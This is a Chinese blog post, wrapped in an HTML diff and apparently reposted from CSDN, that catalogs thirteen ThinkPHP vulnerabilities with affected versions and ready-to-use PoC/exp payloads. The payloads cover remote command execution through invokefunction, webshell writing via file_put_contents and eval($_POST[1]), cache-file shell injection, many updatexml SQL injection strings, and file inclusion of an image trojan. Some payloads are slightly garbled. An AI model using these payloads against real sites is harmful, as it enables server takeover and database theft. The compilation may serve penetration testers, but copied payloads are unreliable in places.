@@ -1,0 +1,493 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[框架漏洞]Thinkphp系列漏洞【截至2020-07-20】 | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[框架漏洞]Thinkphp系列漏洞【截至2020-07-20】 | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="一.Thinkphp
+ThinkPHP是一个快速，兼容而且简单的轻量级国产php开发框架，因为受到众多开发人员的喜爱，其在市场的应用规模跟大，自然也引起了众多安全人员的注意。因此在这里，对相关漏洞进行归纳和总结。
+指纹为：X-Powered..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [框架漏洞]Thinkphp系列漏洞【截至2020-07-20】
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-05-18
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="一thinkphp">一.Thinkphp</h1>
+<p>ThinkPHP是一个快速，兼容而且简单的轻量级国产php开发框架，因为受到众多开发人员的喜爱，其在市场的应用规模跟大，自然也引起了众多安全人员的注意。因此在这里，对相关漏洞进行归纳和总结。<br>
+指纹为：X-Powered-By:ThinkPHP</p>
+<h1 id="二安全漏洞">二.安全漏洞</h1>
+<p><strong>1.ThinkPHP 5.0.23远程代码执行</strong><br>
+参考：http://zone.secevery.com/article/1165<br>
+介绍：Think在实现框架中的核心类Request的method方法实现了表单请求伪装。但由于对<code>$_POST['_method']</code>属性校验不严格，导致攻击者可以变量覆盖掉Request类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。<br>
+影响版本：THINKPHP 5.0.x-5.0.23<br>
+漏洞产生位置：ThinkPHPRequest 类的 method 方法中 (thinkphp/library/think/Request.php)<br>
+挖掘方式</p>
+<pre><code>Method:POST
+url中设置参数s=captcha
+body数据：_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami
+</code></pre>
+<p><strong>2.ThinkPHP 5.0.22远程代码执行</strong><br>
+参考：http://zone.secevery.com/article/1165<br>
+介绍：Thinkphp5.x版本(5.0.20)中没有对路由中的控制器进行严格过滤，在存在admin、index模块、没有开启强制路由的条件下（默认不开启），导致可以注入恶意代码利用反射类调用命名空间其他任意内置类，完成远程代码执行<br>
+影响版本：THINKPHP 5.0.5-5.0.22 、THINKPHP 5.1.0-5.1.30<br>
+漏洞分析：参考https://www.secpulse.com/archives/93903.html即可<br>
+挖掘方式</p>
+<pre><code>1.命令执行
+?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1]=whoami 
+2.代码执行
+?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1]=-1
+
+3.写入文件
+?s=/index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell1.php&amp;vars[1][]=&lt;?php phpinfo();?&gt;
+</code></pre>
+<p><strong>3.ThinkPHP 2.2任意代码执行</strong><br>
+参考：http://zone.secevery.com/article/1165</p>
+<p>影响版本：THINKPHP 2.x-2.2<br>
+挖掘方式</p>
+<pre><code>/module/action/param1/${phpinfo()}
+/module/action/param1/${eval($_POST[1])}                           
+?s=/abc/abc/abc/${THINK_VERSION}
+?s=/abc/abc/abc/${eval($_POST[1])}
+</code></pre>
+<p><strong>4.ThinkPHP 前台缓存写shell</strong><br>
+参考：https://www.cnblogs.com/-chenxs/p/12593865.html</p>
+<p>利用条件：<br>
+开启缓存功能；<br>
+能够猜解出缓存文件名（文件名生成有一定规律）<br>
+缓存内容可控或部分可控，即找到写入的位置（一般与数据库交互的地方）</p>
+<p>影响版本：ThinkPHP3.2.3-5.0.10<br>
+挖掘方式：主要分为数据交互写入恶意php语句，触发缓存数据，访问缓存文件三步。<br>
+tp3.2.3:</p>
+<pre><code>找到与数据库交互的地方，一般是提交post数据的地方，写入任意php语句如%0d%0aphpinfo();//
+缓存文件路径：/Application/Runtime/Temp
+可能缓存文件名：b068931cc450442b63f5b3d276ea4297.php
+</code></pre>
+<p>onethink1.0:</p>
+<pre><code>thinkphp3开发
+缓存文件路径：/Runtime/Temp/
+默认缓存文件名：2bb202459c30a1628513f40ab22fa01a.php
+</code></pre>
+<p>tp5.0.10:</p>
+<pre><code>缓存文件路径：/runtime/cache
+如果可能规则命名的md5值：b068931cc450442b63f5b3d276ea4297，那么缓存文件名为：/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php
+写入的php语句开头需要换行，结尾需要注释掉后面的垃圾数据：换行利用url编码%0d%0a或者%0a，注释用 //。例如写入phpinfo(); 那么应该为：%0d%0aphpinfo();//
+</code></pre>
+<p><strong>5.ThinkPHP 3.2.3/5.1.22 order by注入</strong><br>
+漏洞介绍：<br>
+该漏洞是因为未正确处理所接收数组类型参数的key，直接拼接到了SQL语句的order by后面，导致漏洞的产生。该漏洞可以获取数据库数据，比如用户账号密码，管理后台账号密码，交易数据等。漏洞危害为高危。<br>
+ <br>
+影响版本<br>
+5.1.16&lt;=ThinkPHP&lt;=5.1.22，&lt;=3.2.3<br>
+ <br>
+漏洞分析参考：<br>
+https://nosec.org/home/detail/1821.html<br>
+ <br>
+漏洞复现（内网环境）<br>
+在/application/index/controller/文件夹下建立Index.php文件，内容如下：</p>
+<pre><code>&lt;?php
+namespace app\index\controller;
+class Index{
+public function index()    {
+$data=array();
+$data['username']=array('eq','admin');
+$order=input('get.orderby/a');
+$m=db('user')-&gt;where($data)-&gt;order($order)-&gt;find();
+Sdump($m);
+}
+}
+?&gt;
+</code></pre>
+<p>访问192.168.10.53，选择对应版本</p>
+<p>Poc/exp:<br>
+3.2.3</p>
+<pre><code>?order[updatexml(1,concat(0x3a,user()),1)]=1   
+</code></pre>
+<p>5.1.22</p>
+<pre><code>?orderby[id` | updatexml(1,concat(0x3a,user()),1)%23]=1
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621341613571.png" alt="" loading="lazy"><br>
+<strong>6.Thinkphp3.2.3 find/select/delete注入</strong><br>
+影响版本<br>
+Thinkphp&lt;=3.2.3</p>
+<p>漏洞分析参考：<br>
+https://www.anquanke.com/post/id/157817<br>
+ <br>
+漏洞复现（内网环境）<br>
+在Application\Home\Controller\IndexController.class.php 添加以下代码:</p>
+<pre><code>&lt;?php 
+public function test()  
+{  
+$id = i('id');  
+$res = M('user')‐&gt;find($id);
+//find()  //$res = M('user')‐&gt;delete($id); //delete() 
+//$res = M('user')‐&gt;select($id); //select()  
+}
+</code></pre>
+<p>Poc/exp:<br>
+针对select() 和find()方法 ,有很多地方可注，这里主要列举三个table，alias， where，更多还请自行跟踪一下parseSql的各个parseXXX方法，目测都是可行 的，比如having,group等。<br>
+where:</p>
+<pre><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat x7e,user(),0x7e),1)‐‐
+</code></pre>
+<p>alias:</p>
+<pre><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,u ser(),0x7e),1)‐‐
+</code></pre>
+<p>table:</p>
+<pre><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x 7e),1)‐‐
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1621341996112.png" alt="" loading="lazy"></figure>
+<p>而delete()方法的话同样，这里粗略举三个例子，table,alias,where，但使用table和alias的时候，同时还必须保证where不为空</p>
+<p>where:</p>
+<pre><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x 7e),1)‐‐
+</code></pre>
+<p>alias:</p>
+<pre><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x 7e),1)‐‐
+</code></pre>
+<p>table:</p>
+<pre><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat x7e,user(),0x7e),1)‐‐&amp;id[where]=1
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621342140772.png" alt="" loading="lazy"><br>
+<strong>7.ThinkPHP框架3.2.3 update注入漏洞</strong><br>
+影响版本<br>
+Thinkphp&lt;=3.2.3<br>
+ <br>
+漏洞分析参考：<br>
+https://www.seebug.org/vuldb/ssvid-97234<br>
+ <br>
+漏洞复现（内网环境）<br>
+在Application/Home/Controller/UserController.class.php添加以下代码:</p>
+<pre><code>&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class UserController extends Controller {
+public function index(){
+$User = M(&quot;user&quot;);
+$user['id'] = I('id');
+$data['name'] = I('name');
+$data['pass'] = I('pass');
+$valu = $User-&gt;where($user)-&gt;save($data);
+var_dump($valu);
+}
+}
+</code></pre>
+<p>Poc/exp:</p>
+<pre><code>/index.php/home/user?name=1123&amp;pass=liao&amp;id[0]=bind&amp;id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621342300362.png" alt="" loading="lazy"><br>
+<strong>8.ThinkPHP 5.1.7 update注入</strong><br>
+漏洞介绍<br>
+本次漏洞存在于 Mysql 类的 parseArrayData 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。<br>
+ <br>
+影响版本<br>
+5.1.6&lt;=Thinkphp&lt;=5.1.7(非最新的 5.1.8 版本也可利用)<br>
+ <br>
+漏洞分析参考：<br>
+https://www.freebuf.com/column/206233.html<br>
+ <br>
+漏洞复现（内网环境）<br>
+在\thinkphp\application\index\controller\Index.php添加以下代码:</p>
+<pre><code>class index
+{
+public function index()
+{
+$password=input('get.pass/a');
+db('user')-&gt;where(['id'=&gt;1]-&gt;update(['pass'=&gt;&amp;password]));
+}
+}
+</code></pre>
+<p>Poc/exp:</p>
+<pre><code>/index.php?pass[0]=inc&amp;pass[1]=updatexml(2,concat(0x7e,user()),0)&amp;pass[2]=1
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621342477495.png" alt="" loading="lazy"><br>
+<strong>9.ThinkPHP 5.0.15 insert注入</strong><br>
+漏洞介绍<br>
+本次漏洞存在于 Builder 类的 parseData 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。<br>
+ <br>
+影响版本<br>
+5.0.13&lt;Thinkphp&lt;=5.0.15，5.1.0&lt;=thinkphp&lt;=5.1.5<br>
+ <br>
+漏洞分析参考：<br>
+https://www.freebuf.com/column/205976.html<br>
+ <br>
+漏洞复现（内网环境）<br>
+在\thinkphp\application\index\controller\Index.php添加以下代码:</p>
+<pre><code>class Index
+{
+public function index()
+{
+$username = request()-&gt;get('name/a');
+db('user')-&gt;insert(['name' =&gt; $name]);
+return 'Update success';
+}
+}
+</code></pre>
+<p>Poc/exp:</p>
+<pre><code>/index/index/index?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;name[2]=1
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621342609146.png" alt="" loading="lazy"><br>
+<strong>10.ThinkPHP5 select注入</strong><br>
+漏洞介绍<br>
+本次漏洞存在于 Mysql 类的 parseWhereItem 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。<br>
+ <br>
+影响版本<br>
+ThinkPHP5全版本<br>
+ <br>
+漏洞分析参考：<br>
+https://www.freebuf.com/column/206387.html<br>
+ <br>
+漏洞复现（内网环境）<br>
+在\thinkphp\application\index\controller\Index.php添加以下代码:</p>
+<pre><code>class Index
+{
+public function index()
+{
+$name = request()-&gt;get('name');
+$result = db('user')-&gt;where('name','exp',$name)-&gt;select();
+return 'select success';
+}
+}
+</code></pre>
+<p>Poc/exp:</p>
+<pre><code>/index/index/index?name=) union select updatexml(1,concat(0x7,user(),0x7e),1)#
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621343073743.png" alt="" loading="lazy"><br>
+<strong>11.ThinkPHP5.0.10 select注入</strong><br>
+漏洞介绍<br>
+本次漏洞存在于 Mysql 类的 parseWhereItem 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句。再一个， Request 类的 filterValue 方法漏过滤 NOT LIKE 关键字，最终导致 SQL注入漏洞 的产生。<br>
+ <br>
+影响版本<br>
+ThinkPHP 5.0.10<br>
+ <br>
+漏洞分析参考：<br>
+https://www.freebuf.com/column/206599.html<br>
+ <br>
+漏洞复现（内网环境）<br>
+在\thinkphp\application\index\controller\Index.php添加以下代码:</p>
+<pre><code>class Index
+{
+public function index()
+{
+$username = request()-&gt;get('name/a');
+$result = db('user')-&gt;where(['name' =&gt; $name])-&gt;select();
+var_dump($result);
+}
+}
+</code></pre>
+<p>Poc/exp:</p>
+<pre><code>/index/index/index?name[0]=not like&amp;name[1][0]=%%&amp;name[1][1]=233&amp;name[2]=) union select 1,user()#
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621343114766.png" alt="" loading="lazy"><br>
+<strong>12.ThinkPHP Mysql 聚合函数相关方法注入</strong><br>
+漏洞介绍<br>
+本次漏洞存在于所有 Mysql 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL注入漏洞 的产生。<br>
+ <br>
+影响版本 <br>
+5.0.0&lt;=ThinkPHP&lt;=5.0.21 、 5.1.3&lt;=ThinkPHP5&lt;=5.1.25 。<br>
+ <br>
+漏洞分析参考：<br>
+https://www.freebuf.com/column/206599.html<br>
+ <br>
+漏洞复现（内网环境）<br>
+在\thinkphp\application\index\controller\Index.php添加以下代码:</p>
+<pre><code>class Index
+{
+public function index()
+{
+$options = request()-&gt;get('options');
+$result = db('user')-&gt;max($options);
+var_dump($result);
+}
+}
+</code></pre>
+<p>Poc/exp:<br>
+不同版本payload需稍作调整<br>
+5.0.0~5.0.21 、 5.1.3～5.1.10：</p>
+<pre><code>/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from user%23
+</code></pre>
+<p>5.1.11～5.1.25：</p>
+<pre><code>/index/index/index?options=id)%2bupdatexml(1,concat(0×7,user(),0x7e),1) from user%23`
+</code></pre>
+<p><strong>13.ThinkPHP5文件包含漏洞</strong><br>
+漏洞介绍<br>
+本次漏洞存在于ThinkPHP模板引擎中，在加载模版解析变量时存在变量覆盖问题，而且程序没有对数据进行很好的过滤，最终导致文件包含漏洞的产生。<br>
+ <br>
+影响版本<br>
+5.0.0&lt;=ThinkPHP5&lt;=5.0.18、5.1.0&lt;=ThinkPHP&lt;=5.1.10<br>
+ <br>
+漏洞分析参考：<br>
+https://www.freebuf.com/column/207878.html<br>
+ <br>
+漏洞复现（内网环境）<br>
+在\thinkphp\application\index\controller\Index.php添加以下代码:</p>
+<pre><code>class Index
+{
+public function index()
+{
+$this-&gt;assign(request()-&gt;get());
+return $this-&gt;fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html
+}
+}
+</code></pre>
+<p>创建application/index/view/index/index.html文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马1.jpg放至public 目录下（模拟上传图片操作）。<br>
+ <br>
+Poc/exp:</p>
+<pre><code>/index.php/index/index/index?cacheFile=1.jpg
+</code></pre>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「千 里」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/qq_37865996/article/details/107468816</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E4%B8%80thinkphp">一.Thinkphp</a></li>
+<li><a href="#%E4%BA%8C%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E">二.安全漏洞</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/gong-fang-shi-jie-web-gao-shou-qu/">
+              <h3 class="post-title">
+                攻防世界（Web高手区）
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
